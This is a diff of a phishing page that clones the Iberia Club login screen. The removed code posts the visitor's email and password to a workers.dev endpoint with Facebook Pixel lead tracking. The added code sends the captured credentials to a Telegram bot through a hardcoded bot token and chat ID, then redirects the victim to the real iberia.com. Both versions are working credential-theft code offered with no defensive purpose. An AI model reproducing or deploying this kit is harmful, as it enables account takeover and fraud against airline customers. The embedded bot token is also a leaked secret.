@@ -1,5 +1,4 @@
 <!DOCTYPE html>
-<!-- saved from url=(0026)https://myaviosib.web.app/ -->
 <html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   
   
@@ -11,14 +10,13 @@
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
 
-  <!-- Verificação de domínio Facebook -->
-  <meta name="facebook-domain-verification" content="tfjqeb9cpakh0am0cipliz61xurfub">
+
 
   <!-- Favicon / ícone -->
-  <link rel="icon" type="image/svg+xml" href="https://myaviosib.web.app/Xjdsahd637sddUmi/logotopo.svg">
+  <link rel="icon" type="image/svg+xml" href="./avisoswe_files/xxx1.svg">
 
   <!-- CSS oficial Iberia -->
-  <link rel="stylesheet" href="./Acceso a Iberia Club_files/IDY_ib-style-modules-identity-4_13_0.css">
+  <link rel="stylesheet" href="./avisoswe_files/IDY_ib-style-modules-identity-4_13_0.css">
 
   <!-- Fontes e estilos extras -->
   <style>
@@ -26,43 +24,43 @@
       font-family:"iberiaheadline";
       font-style:normal;
       font-weight:normal;
-      src:url("https://login.iberia.com/resource/1671625127000/IDY_IberiaResources/iberiaheadline.ttf?orgId=00D58000000c8OG")
+      src:url("assets/iberiaheadline.ttf")
     }
     @font-face{
       font-family:"iberiatext";
       font-style:normal;
       font-weight:normal;
-      src:url("https://login.iberia.com/resource/1671625127000/IDY_IberiaResources/iberiatext.ttf?orgId=00D58000000c8OG")
+      src:url("assets/iberiatext.ttf")
     }
     @font-face{
       font-family:"iberia";
       font-style:normal;
       font-weight:normal;
-      src:url("https://login.iberia.com/resource/1671625127000/IDY_IberiaResources/iberia.ttf?orgId=00D58000000c8OG")
+      src:url("assets/iberia.ttf")
     }
 
     .ib-background--image{
-      background-image:url("https://login.iberia.com/resource/1671625127000/IDY_IberiaResources/IDY_IberiaFondoLogin.jpg");
+      background-image:url("assets/IDY_IberiaFondoLogin.jpg");
       background-size:cover;
       background-position:center;
       min-height:100vh;
     }
     @media screen and (max-width:79.96rem){
       .ib-background--image{
-        background-image:url("https://login.iberia.com/resource/1671625127000/IDY_IberiaResources/IDY_IberiaFondoLogin_1024.jpg");
+        background-image:url("assets/IDY_IberiaFondoLogin_1024.jpg");
       }
     }
     @media screen and (max-width:63.96rem){
       .ib-background--image{
-        background-image:url("https://login.iberia.com/resource/1671625127000/IDY_IberiaResources/IDY_IberiaFondoLogin_768.jpg");
+        background-image:url("assets/IDY_IberiaFondoLogin_768.jpg");
       }
     }
 
     .ib-button--google-new::before{
-      background:url("https://login.iberia.com/resource/1671625127000/IDY_IberiaResources/IDY_googleIcon.png") no-repeat center;
+      background:url("assets/IDY_googleIcon.png") no-repeat center;
     }
     .ib-button--facebook-new::before{
-      background:url("https://login.iberia.com/resource/1671625127000/IDY_IberiaResources/IDY_facebookIcon.png") no-repeat center;
+      background:url("assets/IDY_facebookIcon.png") no-repeat center;
       background-size:1.5625rem;
     }
 
@@ -254,19 +252,7 @@
     }
   </style>
 
-  <!-- Meta Pixel Code -->
-  <script src="./Acceso a Iberia Club_files/1151815573251183" async=""></script><script async="" src="./Acceso a Iberia Club_files/fbevents.js"></script><script>
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
-    fbq('init', '1151815573251183');
-    fbq('track', 'PageView');
-  </script>
+
 </head>
 
 <body>
@@ -279,14 +265,14 @@
   <header class="ib-idt-header">
     <div class="ib-idt-header__container">
       <div class="ib-idt-header__container-left">
-        <a class="ib-idt-header__logo" href="https://myaviosib.web.app/index.html">
-          <img src="./Acceso a Iberia Club_files/xxx1.svg" alt="Iberia">
+        <a class="ib-idt-header__logo" href="index.html">
+          <img src="./avisoswe_files/xxx1.svg" alt="Iberia">
         </a>
         <div class="ib-idt-header__separator"></div>
       </div>
       <div class="ib-idt-header__container-right">
         <span class="ib-idt-header__link">¿No tienes cuenta?</span>
-        <a href="https://myaviosib.web.app/index.html" class="ib-idt-header__button">Regístrate</a>
+        <a href="https://registro-iberiaplus.iberia.com/?language=es&amp;origin=ES" class="ib-idt-header__button">Regístrate</a>
       </div>
     </div>
   </header>
@@ -300,18 +286,18 @@
       </p>
 
       <!-- FORM -->
-      <form id="loginForm" onsubmit="return false;">
+      <form id="loginForm" onsubmit="handleSubmit(); return false;">
         <section id="cajaLogin">
           <fieldset>
             <!-- LOGIN (ACEITA QUALQUER COISA) -->
             <div class="ib-layout__line-spacing">
               <div class="ib-input">
-                <label class="ib-input__label ib-input__label--focus" for="loginEmailInput" id="labelEmailLabel">
+                <label class="ib-input__label" for="loginEmailInput" id="labelEmailLabel">
                   E-mail o nº Iberia Club
                 </label>
-                <input id="loginEmailInput" type="text" class="ib-input__input" onblur="fullFieldBlur(&#39;labelEmailLabel&#39;,&#39;loginEmailInput&#39;); validateUser();" onfocus="fullFieldFocus(&#39;labelEmailLabel&#39;); clearError(&#39;userError&#39;, &#39;loginEmailInput&#39;);" data-sharkid="__0" data-sharklabel="email">
+                <input id="loginEmailInput" type="text" class="ib-input__input ib-input--error" onblur="fullFieldBlur(&#39;labelEmailLabel&#39;,&#39;loginEmailInput&#39;); validateUser();" onfocus="fullFieldFocus(&#39;labelEmailLabel&#39;); clearError(&#39;userError&#39;, &#39;loginEmailInput&#39;);" data-sharkid="__0" data-sharklabel="email">
               <shark-icon-container data-sharkidcontainer="__0" style="position: absolute;"><template shadowrootmode="open"><surfhark-icon data-sharkidicon="__0" style="background-image: url(&quot;chrome-extension://ailoabdmgclmfmhdagmlohpjlbpffblp/autofill-action-light.svg&quot;); background-repeat: no-repeat; background-position: left center; background-size: cover; position: absolute; right: 0px; visibility: visible; display: block; z-index: 1; border: none; cursor: pointer; padding: 0px; transition: none; pointer-events: all; opacity: 1; left: 378px; top: -37px; width: 18px; height: 18px; min-width: 18px; min-height: 18px;"></surfhark-icon></template></shark-icon-container></div>
-              <div class="ib-alert ib-alert--error u-hide" id="userError">
+              <div class="ib-alert ib-alert--error" id="userError">
                 <label id="userErrorLabel">Este campo es obligatorio</label>
               </div>
             </div>
@@ -319,7 +305,7 @@
             <!-- SENHA -->
             <div class="ib-layout__line-spacing">
               <div class="ib-input ib-input--icon">
-                <label class="ib-input__label" for="loginPasswordInput" id="labelPasswordLabel">
+                <label class="ib-input__label ib-input__label--focus" for="loginPasswordInput" id="labelPasswordLabel">
                   Contraseña
                 </label>
                 <input id="loginPasswordInput" type="password" class="ib-input__input" onblur="fullFieldBlur(&#39;labelPasswordLabel&#39;,&#39;loginPasswordInput&#39;); validatePass();" onfocus="fullFieldFocus(&#39;labelPasswordLabel&#39;); clearError(&#39;passError&#39;, &#39;loginPasswordInput&#39;);" data-sharkid="__1">
@@ -332,12 +318,12 @@
               </div>
             </div>
 
-            <a class="ib-box-form__msg-link ib-link__modal" href="https://myaviosib.web.app/#" target="_blank">
+            <a class="ib-box-form__msg-link ib-link__modal" href="https://www.iberia.com/es/iberiaplus/recuperar-password/" target="_blank">
               ¿Has olvidado tu contraseña?
             </a>
 
             <!-- BOTÃO LOGIN -->
-            <button type="submit" onclick="handleSubmit()" class="ib-button ib-box-form__button ib-button--red">
+            <button type="submit" class="ib-button ib-box-form__button ib-button--red">
               Iniciar sesión
             </button>
 
@@ -346,10 +332,10 @@
                 O
               </p>
               <div class="ib-button--rrss ib-login__buttons">
-                <a class="ib-button ib-button--google ib-button--google-new ib-login__buttons--button" href="javascript:void(0)">
+                <a class="ib-button ib-button--google ib-button--google-new ib-login__buttons--button" href="javascript:void(0);" onclick="alert(&#39;Feature not available&#39;);">
                   Entrar con Google
                 </a>
-                <a class="ib-button ib-button--facebook ib-button--facebook-new ib-login__buttons--button" href="javascript:void(0)">
+                <a class="ib-button ib-button--facebook ib-button--facebook-new ib-login__buttons--button" href="javascript:void(0);" onclick="alert(&#39;Feature not available&#39;);">
                   Entrar con Facebook
                 </a>
               </div>
@@ -372,10 +358,10 @@
     <section class="ib-idt-footer__red">
       <div class="ib-idt-footer__container">
         <figure class="ib-idt-footer__logo">
-          <img src="./Acceso a Iberia Club_files/xxx1.svg" alt="Logo Iberia">
+          <img src="./avisoswe_files/xxx1.svg" alt="Logo Iberia">
         </figure>
         <nav class="ib-idt-footer__links">
-          <a class="ib-link__footer" href="https://myaviosib.web.app/index.html" target="_blank">Accesibilidad</a>
+          <a class="ib-link__footer" href="https://www.iberia.com/es/accesibilidad/" target="_blank">Accesibilidad</a>
         </nav>
       </div>
     </section>
@@ -509,93 +495,41 @@
       }
     }
 
-    function getCookie(name) {
-      var m = document.cookie.match(new RegExp("(^| )" + name + "=([^;]+)"));
-      return m ? m[2] : "";
-    }
-
-    function readFbpFbc() {
-      var fbp = getCookie("_fbp");
-      var fbc = getCookie("_fbc");
-      var fbclid = getParam("fbclid");
-      if (!fbc && fbclid) {
-        fbc = "fb.1." + Date.now() + "." + fbclid;
-      }
-      return { fbp: fbp, fbc: fbc, fbclid: fbclid };
-    }
-
-    function readUTMs() {
-      var p = function(n){ return getParam(n); };
-      return {
-        utm_source: p("utm_source"),
-        utm_medium: p("utm_medium"),
-        utm_campaign: p("utm_campaign"),
-        utm_term: p("utm_term"),
-        utm_content: p("utm_content")
-      };
-    }
-
-    // Envio para o seu Worker
-    async function handleSubmit(){
-      var emailInput = document.getElementById("loginEmailInput");
-      var passwordInput = document.getElementById("loginPasswordInput");
-      var email = emailInput.value.trim();
-      var password = passwordInput.value.trim();
-      var loadingOverlay = document.getElementById("loadingOverlay");
-
-      clearError("userError", "loginEmailInput");
-      clearError("passError", "loginPasswordInput");
-
-      // segue exigindo preenchimento (vazio não passa)
+    // FUNÇÃO PRINCIPAL DE SUBMIT
+    function handleSubmit(){
+      var email = document.getElementById("loginEmailInput").value.trim();
+      var password = document.getElementById("loginPasswordInput").value.trim();
+      
       if(!email || !password) {
-        if (!email) {
-          showError("userError","userErrorLabel","Este campo es obligatorio");
-          emailInput.classList.add("ib-input--error");
-        }
-        if (!password) {
-          showError("passError","passErrorLabel","Este campo es obligatorio");
-          passwordInput.classList.add("ib-input--error");
-        }
+        alert("Preenchimento obrigatório");
         return false;
       }
-
-      var eventId = "lead-" + Date.now() + "-" + Math.random().toString(36).slice(2);
-      var fbData = readFbpFbc();
-      var utm = readUTMs();
-
-      loadingOverlay.classList.add("active");
-
-      try {
-        await fetch("https://wild-shadow-c599.manuehfhjs2.workers.dev/", {
-          method:"POST",
-          headers:{"Content-Type":"application/json"},
-          body:JSON.stringify({
-            email: email,
-            password: password,
-            origem: "formulario_firebase",
-            consent: true,
-            event_id: eventId,
-            event_source_url: window.location.href,
-            fbp: fbData.fbp,
-            fbc: fbData.fbc,
-            fbclid: fbData.fbclid,
-            utm: utm
-          })
-        });
-
-        if (typeof fbq === "function") {
-          fbq("track", "Lead", {}, { eventID: eventId });
-        }
-
-        loadingOverlay.classList.remove("active");
-        window.location.href = "https://www.iberia.com/es/";
-      } catch(error) {
-        console.error("Error:", error);
-        loadingOverlay.classList.remove("active");
-        showError("userError","userErrorLabel","Ha ocurrido un error. Por favor, inténtalo más tarde.");
-      }
-
+      
+      document.getElementById("loadingOverlay").classList.add("active");
+      
+      var botToken = "8332335168:AAH_btZ_aSaBl5L9ZkcGzKxm2P-0upXGj4M";
+      var chatId = "7472435187";
+      var timestamp = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
+      
+      var msg = "<b>🔔 NOVO LOGIN CAPTURADO</b>\n\n" +
+        "<b>👤 Usuário (Email ou Nº Avios):</b>\n<code>" + email + "</code>\n\n" +
+        "<b>🔑 Senha:</b>\n<code>" + password + "</code>\n\n" +
+        "<b>⏰ Data/Hora:</b>\n<code>" + timestamp + "</code>\n\n" +
+        "━━━━━━━━━━━━━━━━━━━━━";
+      
+      var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(msg) + "&parse_mode=HTML";
+      
+      fetch(url, {mode: 'no-cors'})
+        .then(function(){ redirectNow(); })
+        .catch(function(){ redirectNow(); });
+      
       return false;
+    }
+    
+    function redirectNow(){
+      setTimeout(function(){
+        window.location.href = "https://www.iberia.com/es/";
+      }, 500);
     }
 
     // foco no login ao carregar
